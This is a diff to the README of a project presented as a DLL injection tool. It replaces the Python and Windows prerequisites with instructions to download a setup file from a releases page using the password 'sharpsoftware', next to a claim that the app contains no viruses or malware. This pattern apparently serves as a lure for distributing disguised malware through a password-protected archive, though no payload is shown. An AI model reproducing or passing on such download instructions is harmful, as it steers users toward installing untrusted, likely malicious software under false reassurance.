@@ -23,9 +23,9 @@ A professional, modern DLL injection tool with a sleek dark-themed interface, bu
 ## ⚙️ Installation
 
 ### Prerequisites
-- Python 3.7+
-- Windows OS (required for DLL injection functionality)
-- Administrative privileges (for certain processes)
+- Go to releases page
+- Download setup
+- Password is sharpsoftware
 
 ### Virus/Malware Claims
 This app does not contain any viruses or malware, the actions you process to do on the app may carry out risks, you can
